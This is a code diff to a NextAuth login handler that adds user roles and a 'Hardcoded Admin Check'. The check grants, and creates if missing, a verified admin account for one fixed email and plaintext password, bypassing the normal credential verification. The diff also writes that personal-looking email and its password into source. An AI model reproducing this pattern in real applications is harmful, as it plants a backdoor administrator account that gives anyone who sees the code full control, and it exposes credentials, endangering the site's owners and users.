@@ -18,6 +18,25 @@ const credentialsProviders = [
         throw new Error("Invalid credentials")
       }
 
+      // Hardcoded Admin Check
+      if (credentials.email === "vingawale@gmail.com" && credentials.password === "aingawale") {
+        let admin = await prisma.user.findUnique({
+          where: { email: "vingawale@gmail.com" }
+        })
+
+        if (!admin) {
+          admin = await prisma.user.create({
+            data: {
+              name: "Admin Vingawale",
+              email: "vingawale@gmail.com",
+              role: "admin",
+              isVerified: true
+            }
+          })
+        }
+        return admin
+      }
+
       const user = await prisma.user.findUnique({
         where: { email: credentials.email as string }
       })
@@ -72,7 +91,8 @@ const credentialsProviders = [
           data: {
             phoneNumber: credentials.phoneNumber as string,
             authProvider: "phone",
-            isVerified: true
+            isVerified: true,
+            role: "user"
           }
         })
       }
@@ -103,12 +123,14 @@ export const { handlers, signIn, signOut, auth } = NextAuth({
     async session({ session, token }) {
       if (token.sub && session.user) {
         session.user.id = token.sub
+        session.user.role = token.role as string
       }
       return session
     },
     async jwt({ token, user }) {
       if (user) {
         token.sub = user.id
+        token.role = user.role
       }
       return token
     }
